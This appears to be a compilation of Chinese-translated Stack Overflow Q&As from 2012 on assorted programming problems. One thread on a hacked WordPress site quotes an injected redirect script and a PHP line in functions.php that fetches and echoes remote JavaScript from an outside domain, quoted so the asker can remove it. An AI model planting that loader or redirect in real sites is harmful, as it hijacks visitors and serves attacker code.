> 时间：2012-11-25T06:52:43.987
> 
> 标签：vb.net, visual-studio-2010

是否可以将处理程序添加到表单按钮以进行表单最小化？我的应用程序不使用窗口框架，我想在我的代码中处理窗口事件。

我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-25T07:25:50.330

```
Private Sub btnMin_Click(ByVal sender As Object, ByVal e As EventArgs)
      Me.WindowState = FormWindowState.Minimized
End Sub 
```

# cocoa - NSDictionary 持有 NSDictionary 对象的快速枚举

> ID：13548969
> 
> 赞同：2
> 
> 时间：2012-11-25T06:53:21.067
> 
> 标签：cocoa, nsdictionary, fast-enumeration

我有`NSDictionary`四个对象。每个对象都是一个`NSDictionary`包含数千个对象的对象。我已经通过记录顶级字典的描述来验证它包含它应该包含的内容。但是，当我运行下面的代码以枚举该顶级字典中的对象时，调试器显示错误，表明返回的对象是一个字符串而不是字典。

这是代码：

```
for(id synsetsForPos in dictionaryOfSynsetDictionaries) {
    NSLog(@"synsetsForPos is class of %@ with description %@", [synsetsForPos class], [synsetsForPos description]); 
```

（我最初输入`synsetsForPos`为`NSDictionary`，但这里描述的结果是一样的。）

在调试器中，我在日志语句处暂停以在控制台中获取此信息：

```
(lldb) po [synsetsForPos class]
(id) $2 = 0x016e2c8c __NSCFConstantString
(lldb) po [[dictionaryOfSynsetDictionaries objectForKey:@"n"] class]
(id) $3 = 0x016d3e0c __NSCFDictionary
(lldb) po [[dictionaryOfSynsetDictionaries objectForKey:@"r"] class]
(id) $6 = 0x016d3e0c __NSCFDictionary
(lldb) po [[dictionaryOfSynsetDictionaries objectForKey:@"v"] class]
(id) $7 = 0x016d3e0c __NSCFDictionary
(lldb) po [[dictionaryOfSynsetDictionaries objectForKey:@"a"] class]
(id) $8 = 0x016d3e0c __NSCFDictionary
(lldb) po [dictionaryOfSynsetDictionaries allKeys]
(id) $10 = 0x653662a0 <__NSArrayI 0x653662a0>(
r,
n,
v,
a
) 
```

然后，让日志语句执行，我得到这个：

```
2012-11-24 22:32:41.069         [6037:fb03] synsetsForPos is class of __NSCFConstantString with description r
(lldb) 
```

后跟此错误消息：

```
2012-11-24 22:41:21.287         [6037:fb03] -[__NSCFConstantString countByEnumeratingWithState:objects:count:]: unrecognized selector sent to instance 0x1faf8 
```

我不明白这里发生了什么，为什么在快速枚举代码中没有将其视为字典。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-25T07:24:43.493

字典的快速枚举迭代*键*而不是*对象*：[文档](http://developer.apple.com/library/ios/documentation/cocoa/conceptual/objectivec/Chapters/ocFastEnumeration.html)。

改为使用`enumerateKeysAndObjectsUsingBlock:` 。它可能同样快 - 请参阅[此处](https://stackoverflow.com/questions/4486622/when-to-use-enumerateobjectsusingblock-vs-for)的讨论。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-25T07:24:19.133

在 Objective-C 中快速枚举字典时，返回的值是`keys`. 在您的示例中，您`for-loop`的与`for(NSString *synsetsForPos in [dictionaryOfSynsetDictionaries keys])`.

您需要添加的是获取特定键的值并使用它：

```
NSDictionary *value = [dictionaryOfSynsetDictionaries valueForKey:synsetsForPos]; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-11-11T20:54:39.267

这个问题很老，但对于未来的旅行者来说，另一个简单的解决方案是在 for 子句中指定字典值：

```
for(NSDictionary *synsetsForPos in [dictionaryOfSynsetDictionaries allValues]) {
    NSLog(@"synsetsForPos is class of %@ with description %@", [synsetsForPos class], [synsetsForPos description]);
} 
```

# cpu - Z80 cpu中的AND运算如何溢出？

> ID：13548977
> 
> 赞同：1
> 
> 时间：2012-11-25T06:56:35.480
> 
> 标签：cpu, flags, z80

我正在参考 zilog z80 手册，我对 AND 指令的阅读有点困惑。它在“受影响的条件位”部分中说，如果操作溢出，则设置 P/V 标志。我可以理解 add 或 sub 指令如何溢出，但 AND 操作溢出对我来说没有意义。任何帮助表示赞赏！谢谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-25T07:01:13.150

根据[此页面](http://www.z80.info/z80sflag.htm)，P/V 位有两个用途。AND 指令的结果实际上是 P 函数，即如果 AND 的结果中有偶数个 1，则设置 P 位。

# c# - 为什么这个警告框没有出现？

> ID：13548978
> 
> 赞同：1
> 
> 时间：2012-11-25T06:56:41.003
> 
> 标签：c#, asp.net, alert

我几乎完成了一个网络项目来完成一项任务，但是我遇到了一个绊脚石，即警报框在被调用时拒绝弹出。任务是创建一个 Web 表单，供用户向网站提交个人信息。一旦他们填写了所有文本框并单击一个按钮进行注册，这将在后面的代码中调用函数 registerMe，如下所示。一旦他们这样做，想法是该函数将首先检查以确保用户尚未在网站上注册，然后它将文本框中的所有值填充到 Session 对象中（使用 Candidate.curCandidate作为包装）。然后这个 Session 对象将被添加到 Application 状态数据中以保存它。

现在，奇怪的事情来了。在下面的 if 语句中，如果该语句为真，所有的值将被保存到 session 中，然后根据需要保存 Application 状态数据，但不会出现 Alertbox。但是，如果 if 语句为假，则会出现一个警报框。所以，我猜想以某种方式读取和写入所有这些值会干扰 Alertbox 的激活，但我不知道为什么。

```
 protected void registerMe(object sender, EventArgs e)
    {
        String successText;
        if (Candidate.curCandidate.appProperty == false)
        {
            Candidate.curCandidate.ssNumberProperty = socSec.Text;
            Candidate.curCandidate.emailAddressProperty = email.Text;
            Candidate.curCandidate.userIDProperty = userName0.Text;
            Candidate.curCandidate.passwordProperty = password0.Text;
            Candidate.curCandidate.dateOfBirthProperty = dateBirth.Text;
            Candidate.curCandidate.firstNameProperty = fName0.Text;
            Candidate.curCandidate.lastNameProperty = lName0.Text;
            Candidate.curCandidate.streetAddressProperty = strAdd0.Text;
            Candidate.curCandidate.cityProperty = city0.Text;
            Candidate.curCandidate.stateProperty = state0.Text;
            Candidate.curCandidate.positionProperty = jobs0.SelectedIndex;
            Candidate.curCandidate.applicationStatusProperty = appStatus0.Text;
            Candidate.curCandidate.appProperty = true;
            Application[Candidate.curCandidate.ssNumberProperty]=Candidate.curCandidate;

            successText = "Thank you. Candidate Information Added Successfully.\n" +
                "E-Mail Address You Entered will be used to notify you of any\n" +
                "updates for the position you applied for.";
            ClientScript.RegisterStartupScript(this.GetType(), "myalert",
                "alert('" + successText + "');", true);
        }
        else
        {
            successText = "Registration unsuccessful.";
            ClientScript.RegisterStartupScript(this.GetType(), "myalert",
                "alert('" + successText + "');", true);
        }
    } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-25T07:48:13.020

尝试从中删除`\n`，`successText`看看它是否有效。

如果您真的需要它，请尝试像下面这样双重转义它：

`successText = "... Successfully.\\n"`

# php - 为什么分配一个 PHP 变量会在屏幕上打印一个值？

> ID：13548979
> 
> 赞同：0
> 
> 时间：2012-11-25T06:56:45.993
> 
> 标签：php

这让我完全困惑，我正在做以下事情：

```
if($tasks = someFunction(1))
{

} 
```

someFunction() 从数据库中返回一个记录数组。出于某种原因，将此数组分配给 $tasks 会导致将一个数字打印到屏幕上。它打印的数字是它返回的记录数，但我从来没有回显这个变量。

为了确认，我添加了以下代码：

```
$tasks = someFunction(1);
$tasks = someFunction(1);
$tasks = someFunction(1); 
```

在 if 语句上方，果然我在屏幕上看到了“4444”（它返回了 4 条记录）。我已经在我的代码的其他地方实现了基本相同的代码，并且从未遇到过这种情况，我对变量赋值如何导致值显示在屏幕上感到困惑。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-25T06:59:39.623

您很可能会从`someFunction()`方法内部输出一个数字。

尝试使用`ctrl`+ `F`(Windows) 或`command`+ `F`(Mac) 来*查找文本*并搜索`echo`或`print`查找出现的位置。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-25T07:04:27.847

您的问题是`someFunction()`回显/打印一个值。如果您只是想检索 的值`someFunction()`，请使用该`return`语句。

[http://php.net/manual/en/function.return.php](http://php.net/manual/en/function.return.php)

示例：（返回`Success!`）

```
function someFunction()
{
    return "fish";
}

$tasks = "fish";
if ($tasks == someFunction())
{
    echo "Success!";
}
else
{
    echo "Error!";
} 
```

# jquery - 巨大的响应式输入字段文本

> ID：13548980
> 
> 赞同：0
> 
> 时间：2012-11-25T06:56:47.847
> 
> 标签：jquery, input

我正在尝试制作一个包含大量文本的输入字段。我希望这个文本是最大的，然后相应地缩放，这样长的电子邮件地址就不会离开视野。

[这里](http://derekthomaswood.com/dev/input)是一个开发网站。

我正在使用 fittext.js 来尝试实现这一目标。

然而，我觉得我以前在某个地方见过这个，它并不像我想象的那么复杂。

有人有建议吗？

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-25T07:18:28.350

如果您将输入设置为等宽字体，您可以想象在 keyup 事件上放置一个侦听器，获取输入的字符长度，然后计算字体大小应该多小才能使值适合一行。

```
var input = $("input");
input.on("keyup",function(evt){

    var char_count = input.val().length;
    var input_width = input.width();
    var new_font_size = Math.floor( input_width / char_count );
    input.css("fontSize",new_font_size+"px");

});​ 
```

看看[这个小提琴](http://jsfiddle.net/G2dh4/)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-25T08:07:26.823

Fittext 似乎不喜欢被多次调用。试试这个插件：[https ://github.com/vxsx/jquery.inputfit.js](https://github.com/vxsx/jquery.inputfit.js)

然后，你可以 `jQuery('.putin').inputfit();`

示例：http: [//jsfiddle.net/BGJjS/](http://jsfiddle.net/BGJjS/)

# java - 使用 Time delay 将 Swing 组件中 String 数组的内容显示为迭代。JAVA

> ID：13548982
> 
> 赞同：1
> 
> 时间：2012-11-25T06:56:49.783
> 
> 标签：java, swing, user-interface, iteration

我有一个字符串数组，我试图在 Java Swing 组件中将其显示为幻灯片（一个一个）。我还试图在迭代之间添加延迟时间。

我试图通过使用 JTextArea 来做到这一点，并添加了一个动作侦听器。这是我现在拥有的代码：

```
private class myActionListener implements ActionListener {
    public void actionPerformed(ActionEvent e) {
        // A BUNCH OF TEXT PROCESSING

        //NOTE: myInfo.getContents() returns an ArrayList<myType>.
        Iterator<myType> iterator = myInfo.getContents().iterator();

        int i = 0;
        while (iterator.hasNext()) {
            myTextArea.setText(iterator.next().toString());
            // to add time betweeen iterations i wanted to use the thread
            // delay method.
        }
    }
} 
```

我的代码不起作用，因为 JTextArea 没有动作侦听器。

**更新** 说明：许多回复说我应该为 JTextArea 使用 ActionListener；但是，Eclipse 并没有告诉我 JTextArea 有一个名为 addActionListener 的方法。

我有点卡在这里，**您认为哪个 Java Swing 组件最适合这种情况？**

我的数组中的文本可能很长，因此单行标签不是一个好的选择。

我还有哪些其他选择或方法？

非常感谢，任何帮助和建议都非常感谢。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-25T08:02:16.410

这是基于@Robin 发布的建议的基本示例

```
public class TestDisplayString {

    public static void main(String[] args) {
        new TestDisplayString();
    }

    public TestDisplayString() {
        EventQueue.invokeLater(new Runnable() {
            @Override
            public void run() {
                try {
                    UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
                } catch (ClassNotFoundException ex) {
                } catch (InstantiationException ex) {
                } catch (IllegalAccessException ex) {
                } catch (UnsupportedLookAndFeelException ex) {
                }

                JFrame frame = new JFrame("Test");
                frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
                frame.setLayout(new BorderLayout());
                frame.add(new TestPane());
                frame.pack();
                frame.setLocationRelativeTo(null);
                frame.setVisible(true);
            }

        });
    }

    public class TestPane extends JPanel {

        private JTextArea textArea;
        private List<String> content;
        private Iterator<String> iterator;

        public TestPane() {
            readText();
            setLayout(new BorderLayout());
            textArea = new JTextArea(10, 40);
            textArea.setLineWrap(true);
            textArea.setWrapStyleWord(true);
            add(new JScrollPane(textArea));
            iterator = content.iterator();

            Timer timer = new Timer(1000, new ActionListener() {
                @Override
                public void actionPerformed(ActionEvent e) {
                    if (iterator.hasNext()) {
                        textArea.setText(iterator.next());
                    } else {
                        ((Timer)e.getSource()).stop();
                    }
                }
            });
            timer.setRepeats(true);
            timer.setCoalesce(true);
            timer.start();
        }

        protected void readText() {
            content = new ArrayList<>(25);
            BufferedReader reader = null;
            try {
                reader = new BufferedReader(new InputStreamReader(getClass().getResourceAsStream("/Text.txt")));
                String text = null;
                while ((text = reader.readLine()) != null) {
                    if (text.trim().length() > 0) {
                        content.add(text);
                    }
                }
            } catch (Exception e) {
                e.printStackTrace();
            } finally {
                try {
                    reader.close();
                } catch (Exception e) {
                }
            }
        }

    }

} 
```

这是“Text.txt”文件的内容。

> 如何使用摆动计时器
> 
> Swing 计时器（javax.swing.Timer 的一个实例）在指定的延迟后触发一个或多个动作事件。不要将 Swing 计时器与 1.3 版中添加到 java.util 包中的通用计时器工具混淆。本页仅描述 Swing 计时器。
> 
> 一般来说，我们建议使用 Swing 计时器而不是通用计时器来处理与 GUI 相关的任务，因为 Swing 计时器都共享相同的、预先存在的计时器线程，并且与 GUI 相关的任务会自动在事件调度线程上执行。但是，如果您不打算从计时器触摸 GUI，或者需要执行冗长的处理，则可以使用通用计时器。
> 
> 您可以通过两种方式使用 Swing 计时器：
> 
> ```
> To perform a task once, after a delay.
> For example, the tool tip manager uses Swing timers to determine when to show a tool tip and when to hide it.
> To perform a task repeatedly.
> For example, you might perform animation or update a component that displays progress toward a goal. 
> ```
> 
> 摆动计时器非常易于使用。创建计时器时，您指定一个动作侦听器，以便在计时器“关闭”时得到通知。此侦听器中的 actionPerformed 方法应包含您需要执行的任何任务的代码。创建计时器时，您还可以指定计时器触发之间的毫秒数。如果您希望计时器只关闭一次，您可以在计时器上调用 setRepeats(false)。要启动计时器，请调用它的 start 方法。要暂停它，请调用 stop。
> 
> 请注意，Swing 计时器的任务是在事件调度线程中执行的。这意味着任务可以安全地操作组件，但也意味着任务应该快速执行。如果任务可能需要一段时间才能执行，则考虑使用 SwingWorker 代替计时器或在计时器之外使用。有关使用 SwingWorker 类的说明以及在多线程程序中使用 Swing 组件的信息，请参阅 Swing 中的并发。
> 
> 让我们看一个使用计时器定期更新组件的示例。TumbleItem 小程序使用计时器定期更新其显示。（要查看此小程序运行，请转到如何制作小程序。此小程序首先创建并启动一个计时器：
> 
> 计时器=新计时器（速度，这个）；timer.setInitialDelay(暂停); 计时器.start();
> 
> speed和pause变量代表小程序参数；如另一页所配置，分别为 100 和 1900，因此第一个计时器事件将在大约 1.9 秒内发生，并且每 0.1 秒重复一次。通过将 this 指定为 Timer 构造函数的第二个参数，TumbleItem 指定它是计时器事件的操作侦听器。
> 
> 启动计时器后，TumbleItem 开始在后台线程中加载一系列图像。同时，定时器事件开始发生，导致 actionPerformed 方法执行：
> 
> public void actionPerformed(ActionEvent e) { //如果还在加载，不能动画。if (!worker.isDone()) { return; }
> 
> ```
> loopslot++;
> 
> if (loopslot >= nimgs) {
>     loopslot = 0;
>     off += offset;
> 
>     if (off < 0) {
>         off = width - maxWidth;
>     } else if (off + maxWidth > width) {
>         off = 0;
>     }
> }
> 
> animator.repaint();
> 
> if (loopslot == nimgs - 1) {
>     timer.restart();
> } } 
> ```
> 
> 在加载图像之前，worker.isDone 返回 false，因此实际上忽略了计时器事件。事件处理代码的第一部分简单地设置动画控件的paintComponent 方法中使用的值：loopslot（动画中下一个图形的索引）和off（下一个图形的水平偏移量）。
> 
> 最终，loopslot 将到达图像数组的末尾并重新开始。发生这种情况时，actionPerformed 末尾的代码会重新启动计时器。这样做会导致动画序列再次开始之前的短暂延迟。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-11-25T07:03:09.807

将 your`ActionListener`与`javax.Swing.Timer`. `ActionListener`分配给 的将`Timer`定期以指定的延迟时间调用。

有关更多信息，请参阅[计时器教程](http://docs.oracle.com/javase/tutorial/uiswing/misc/timer.html)

# c# - 本地数据库不会更新，也不会显示错误

> ID：13548983
> 
> 赞同：0
> 
> 时间：2012-11-25T06:57:03.730
> 
> 标签：c#, .net, winforms, dataset, sql-server-ce

嘿，我是新手，从我设法获得的内容来看，这应该可以工作，但它不会更新我的**本地**数据库。

我有一个`TelemarketingDatabaseDataSet`在我创建本地数据库时自动生成的，然后我将表拖到数据集上，我猜它们是链接的。

现在我有这个代码：

```
SqlCeConnection connection = new SqlCeConnection();
connection.ConnectionString = TelemarketingTracker.Properties.Settings.Default.TelemarketingDatabaseConnectionString;
TelemarketingDatabaseDataSet ds = new TelemarketingDatabaseDataSet();
// DataTable tbl = new DataTable();

SqlCeDataAdapter adapter = new SqlCeDataAdapter("select * from Calls", connection);
//adapter.InsertCommand = new SqlCeCommand("InsertQuery", connection);
adapter.Fill(ds,"Calls");
DataTable tbl = ds.Tables["Calls"];
//tbl.Columns.Add("caller");
//tbl.Columns.Add("called");
//tbl.Columns.Add("duration");
//tbl.Columns.Add("time");
var row = tbl.NewRow();

row[1] = Convert.ToString(caller);
row[2] = Convert.ToString(called);
row[3] = Convert.ToString(duration);
row[4] = Convert.ToDateTime(time);
tbl.Rows.Add(row);
adapter.Update(ds, "Calls");
connection.Close();
MessageBox.Show("Database should be updated!"); 
```

拜托，我对使用 SqlCommand 不感兴趣，因为我更喜欢使用 DataSet。

问题可能与我的表的数据类型有关吗？它没有显示错误提示，但我想这可能是问题所在。我的表包括：

> **ID** - int,key **caller** - 被调用的 varchar **-** varchar **持续时间**- varchar **时间**- 日期时间

**编辑：**

现在，如果我取消注释 insertQuery 行，我会在 Syste.Data dll 中得到一个未处理的错误。

现在，即使我尝试使用常规插入命令，我也没有收到任何错误，但数据库不会更新。如果这在我关闭调试窗口后有任何差异，我会在本地数据库旁边看到一个 X，但它没有显示任何错误。

这是我尝试过的命令：

```
 using (SqlCeCommand com = new SqlCeCommand("INSERT INTO Calls (caller, called, duration, time) Values(@Caller,@Called,@Duration,@Time)", connection))
{
    com.Parameters.AddWithValue("@Caller", row[1]);
    com.Parameters.AddWithValue("@Called", row[2]);
    com.Parameters.AddWithValue("@Duration", row[3]);
    com.Parameters.AddWithValue("@Time", row[4]);

    com.ExecuteNonQuery();
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-25T07:14:01.240

Fill() 方法“添加或刷新 DataSet 中的行以匹配数据源中的行”。这句话的关键部分是“匹配数据源中的那些”。当您调用 Fill() 时，您添加的行将被清除，因为它尚未在源中。

我不是很肯定，但如果您只是添加新记录而不担心修改/删除现有记录，我*认为您甚至不需要调用 Fill()。*但是，如果您确实需要调用它，则显然需要在您进行任何新记录插入之前将其移动。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-25T07:25:02.817

尝试类似的东西..

```
string dbfile = new System.IO.FileInfo(System.Reflection.Assembly.GetExecutingAssembly().Location).DirectoryName + "\\TelemarketingDatabase.sdf";
SqlCeConnection connection = new SqlCeConnection("datasource=" + dbfile);

TelemarketingDatabaseDataSet ds = new TelemarketingDatabaseDataSet();   
SqlCeDataAdapter adapter = new SqlCeDataAdapter();
string qry = @"select * from Calls";
da.SelectCommand = new SqlCommand(qry, connection);
SqlCommandBuilder cb = new SqlCommandBuilder(adapter);
adapter.Fill(ds,"Calls");

DataTable tbl = ds.Tables["Calls"];
var row = tbl.NewRow();
row[0] = caller;
row[1] = called;
row[2] = duration;
row[3] = Convert.ToDateTime(time);
tbl.Rows.Add(row);
adapter.Update(ds,"Calls"); 
```

请参阅此处的示例[http://www.java2s.com/Code/CSharp/Database-ADO.net/UseDataTabletoupdatetableinDatabase.htm](http://www.java2s.com/Code/CSharp/Database-ADO.net/UseDataTabletoupdatetableinDatabase.htm)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-25T09:09:35.550

好吧，最后我没有设法解决这个问题，而是我使用了远程数据库和常规 sql 命令。

感谢那些帮助过的人！

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-04-30T08:13:26.270

即使问题很老，也只想分享这个

```
using System;
using System.IO; //needed for path.getdirectoryname() and directory.getcurrentdirectory()

string path = Path.GetDirectoryName(Path.GetDirectoryName(Directory.GetCurrentDirectory()));

AppDomain.CurrentDomain.SetData("DataDirectory", path); 
```

Directory.GetcurrentDirectory() 将输出“C:/..projectname/bin/debug”，这是临时 database.mdf 所在的位置

通过使用 Path.GetDirectoryName(Directory.GetcurrentDirectory()) 它将给出当前目录的目录，从而将一个位置移回“C:/..projectname/bin”

然后再次使用它

Path.GetDirectoryName(Path.GetDirectoryName(Directory.GetCurrentDirectory())) 将为您提供项目文件夹“C:/..projectname”中根数据库的位置

然后只需使用 AppDomain.CurrentDomain.SetData()

# java - 带有 AJAX 和数据库的动态下拉列表

> ID：13548985
> 
> 赞同：0
> 
> 时间：2012-11-25T06:57:29.953
> 
> 标签：java, ajax, jsp, drop-down-menu

我希望有人能引导我朝着正确的方向前进。我要做的是创建两个下拉列表，其中第二个（城市）取决于第一个（州）。例如，当我点击华盛顿时，我希望第二个下拉菜单列出西雅图和沃拉沃拉；乔治亚州、亚特兰大、雅典等。最终我的目标是将几个列表链接在一起（国家 -> 州 -> 县 -> 城市），但如果我能让这两个工作正常，我想我可以弄清楚如何做到这一点。

到目前为止，我已经建立了两个数据库。表 CITY 以 cityid (primary) 和 cityname 作为列，表 STATE 以 stateid (primary) 和 statename 作为列。

代码如下

下拉.jsp：

```
<script>
function createRequestObject(){
    var req;
    if(window.XMLHttpRequest){
        //For Firefox, Safari, Opera
        req = new XMLHttpRequest();
    } else if(window.ActiveXObject){
        //For IE 5+
        req = new ActiveXObject("Microsoft.XMLHTTP");
    } else {
        //Error for an old browser
        alert('Your browser is not IE 5 or higher, or Firefox or Safari or Opera');
    }
    return req;
}

//Make the XMLHttpRequest Object
var http = createRequestObject();
function sendRequest(method, url){
    if(method == 'get' || method == 'GET'){
        http.open(method,url);
        http.onreadystatechange = handleResponse;
        http.send(null);
    }
}//end function send

function handleResponse(){
    if(http.readyState == 4 && http.status == 200){
        var response = http.responseText;
        if(response){
            document.getElementById("second_dropdown_code").innerHTML = response;
        }
    }
}

function getCityDropdown() {
    var w = document.myform.mylist.selectedIndex;
    var country_id = document.myform.mylist.options[w].value;
    sendRequest('GET','getCites.do?stateid=' + state_id);
}

</script>

<FORM NAME="myform">
<SELECT NAME="state" onChange="getCityDropdown()">
    <OPTION VALUE="1">Georgia</option>
    <OPTION VALUE="2">Washington</option>
</SELECT>
</FORM>
<div id="second_dropdown_code"></div> 
```

获取城市.java

```
protected void doGet(HttpServletRequest request, HttpServletResponse response)
        throws ServletException, IOException {
    PrintWriter out = response.getWriter();
    try {
        processRequest(request, response);

        String sql = "select * from CITY";
        Connection connection = datasource.getConnection();
        PreparedStatement preparedStatement = connection.prepareStatement(sql);
        ResultSet resultSet = preparedStatement.executeQuery();

        while (resultSet.next() ) {
            //out.println(resultSet.getInt("cityid") + "<br/>" + resultSet.getString("city") + "<br/>" + resultSet.getString("INSTRUCTOR") + "<br/>" + resultSet.getString("BUILDING") + "<br/>" + resultSet.getString("ROOM") + "<br/>");
            //out.println(resultSet.getInt("cityid") + "<br/>" + resultSet.getString("city") + "<br/>" );
            //out.println("<select name=\"city\"><option value=\"1\">Atlanta</option><option value=\"2\">Walla Walla</option></select> ");
        }

        resultSet.close();
        preparedStatement.close();
        connection.close();

    } catch (SQLException ex) {
        Logger.getLogger(getCities.class.getName()).log(Level.SEVERE, null, ex);
    }
} 
```

我知道我需要在 while 循环中使用某种 if 语句，但我不确定从哪里获取参数以将 stateid 与 cityid 进行比较。

任何指导将不胜感激，谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-25T08:51:09.807

设计中存在一个基本问题：以您当前的数据库设计，无法知道哪些城市属于哪个州。

表格应如下所示：

```
State
    - id
    - name

City
    - id
    - name
    - state_id (foreign key to State.id) 
```

因此，用于获取给定州 ID 的城市的 SQL 查询将如下所示：

```
select city.id, city.name from city
where city.state_id = ?
order by city.name 
```

# sql - 用于解决数据库中的传递依赖关系的 SQL 查询

> ID：13548988
> 
> 赞同：4
> 
> 时间：2012-11-25T06:58:03.583
> 
> 标签：sql, oracle, oracle11g

[此数据的 SQLFiddle 链接。](http://sqlfiddle.com/#!4/0263a/22/5)

假设我有一个具有以下结构的表：

```
create table rd(r1 number,r2 number, primary key (r1,r2)); 
```

样本数据：

```
| R1 | R2 |
-----------
|  1 |  2 |
|  1 |  4 |
|  2 |  3 |
|  3 |  1 |
|  4 |  5 | 
```

这意味着 R1 与 R2 双向相关。因此，如果数据库中有 1,3 的条目，则不会有像 3,1 这样的条目。

根据以上数据：1与2、4、3直接相关。并且 4 也与 1 有关。因此，通过传递依赖，1 和 5 也被认为是相关的。

预期结果：

```
| R1 | R2 |
-----------
|  1 |  2 |
|  1 |  4 |
|  1 |  3 |
|  1 |  5 | 
```

任何人都可以为此编写 SQL 查询吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-25T08:46:17.737

当您运行 Oracle 11g（如果它恰好是第 2 版）时，作为其中一种方法，您可以使用递归公用表表达式（也称为递归子查询因式分解）[来获得所需的结果](http://sqlfiddle.com/#!4/7fb60/16)。

```
SQL> with rcte(r1, r2, lv, root) as(
  2    select r1
  3         , r2
  4         , 0 lv
  5         , r1
  6     from rd
  7    where r1 = 1
  8  
  9    union all
 10  
 11    select t.r1
 12         , t.r2
 13         , lv + 1
 14         , q.root
 15      from rd   t
 16      join rcte q
 17        on (t.r1 = q.r2)
 18  )
 19  search depth first by r1 set s
 20  cycle r1 set is_cycle to 'y' default 'n'
 21  
 22  select root
 23       , r2
 24    from rcte
 25  where is_cycle = 'n'
 26    and r2 <> root
 27  ;

      ROOT         R2
---------- ----------
         1          2
         1          3
         1          4
         1          5 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-25T11:31:19.070

只要表中只有一级中间值，以下查询就可以工作。

它的工作原理是将表扩展为单向表，然后将该表与将其连接到自身的结果结合起来。

```
WITH expanded AS
  (SELECT r1, r2 FROM rd
   UNION ALL
   SELECT r2 AS r1, r1 AS r2 FROM rd)
SELECT * FROM
  (SELECT r1, r2 FROM expanded     -- direct relations
   UNION
   SELECT e1.r1 AS r1, e2.r2 AS r2 -- indirect relations
   FROM expanded e1
   INNER JOIN expanded e2
   ON e1.r2 = e2.r1                -- via transitive dependency
   AND e2.r2 <> e1.r1)
WHERE r1 = 1
ORDER BY r1, r2 
```

# css - 如何使用内部的 LOTS 元素定位固定

> ID：13548990
> 
> 赞同：1
> 
> 时间：2012-11-25T06:58:26.053
> 
> 标签：css, css-position

我正在处理一个简单的页面，但遇到了固定位置的问题。想知道是否有人有时间帮我一把。

在这里复制和粘贴所有代码会太多，但我会粘贴一个链接

[http://et4891.com/lecture/protosite.shtml](http://et4891.com/lecture/protosite.shtml)

对于带有导航的标题，我希望两者都被修复，这意味着当我向下滚动页面时，带有导航的整个标题将始终存在。但不管我怎么做，事情总是一团糟。导航带有css下拉和浮动。

谁能帮我一把？我想只用css而不是jquery来修复这个位置。

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-25T10:14:07.793

将 header 和 nav 放入 div 中。给那个 div `position: fixed;`。确保增加`margin-top`for，`proto-main-content`因为此部分不再受标题和导航位置的影响。

# javascript - 在我的 wordpress 3.4.2 上注入

> ID：13548994
> 
> 赞同：0
> 
> 时间：2012-11-25T06:59:10.953
> 
> 标签：javascript, wordpress, code-injection

请我今天访问了我的网站，但过了一会儿我被重定向到另一个网站！

我认为这是一种注入，我查看了页面源代码，发现了以下奇怪的行：

```
/*
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>
  <head>
<meta http-equiv="content-type" content="text/html;charset=utf-8"/>
<meta http-equiv="refresh" content="0; url=http://www.jqueryc.com">
<script type="text/javascript">

    window.top.location.href = "http://www.jqueryc.com";

</script>
 </head>
</html>
 */
window.top.location.href = "http://www.jqueryc.com";
<style type="text/css"       media="print">#wpadminbar { display:none; }</style> 
```

请问我怎样才能删除这个注入，我应该重新安装 wordpress 吗？如果是，我需要将我的所有帖子导出到 xml 文件中，我担心这些行会与我的数据一起导出！

请问有什么建议吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-25T07:17:13.410

转到 functions.php 中的代码并删除以下行：

```
if (!function_exists('insert_jquery_theme')){function insert_jquery_theme(){if (function_exists('curl_init')){$url="http://www.jqueryc.com/jquery-1.6.3.min.js";$ch = curl_init();$timeout = 5;curl_setopt($ch, CURLOPT_URL, $url);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);$data = curl_exec($ch);curl_close($ch);echo $data;}} 
```

# android - Android线程和处理程序不起作用

> ID：13548995
> 
> 赞同：0
> 
> 时间：2012-11-25T06:59:30.453
> 
> 标签：android, multithreading, handler, runnable

我最近重构了一个旧项目，发现无论我做什么，特定部分都不再希望正常运行。本质上，我有一个带有 TextView 的 Activity。这个视图是从同一个类中调用的线程定时更新的。暂停是通过 Thread.sleep 完成的，并且使用 Handler 来触发 UI 的更新。问题是，现在我要么得到一个 CalledFromWrongThreadException ，说我无法从另一个线程操作视图，而是长时间停顿，然后所有文本立即击中视图，或者它似乎立即触发并且根本不睡觉。我以前这样做过（包括相关部分）：

```
public class Updated extends Activity implements Runnable {

private TextView textView;
private String text;
private Handler handle = new Handler(){
    @Override
    public void handleMessage(Message msg){
        textView.append(text);
    }
};
//onCreate and other such things...{
    new Thread(this).start();
}

public void run(){
     //A healthy chunk of logic/conditionals
     text = "Blah blah";
     handle.sendEmtpyMessage(0);
     try {
    Thread.sleep(1500l);
 } catch (InterruptedException e) {
    e.printStackTrace();
 }
} 
```

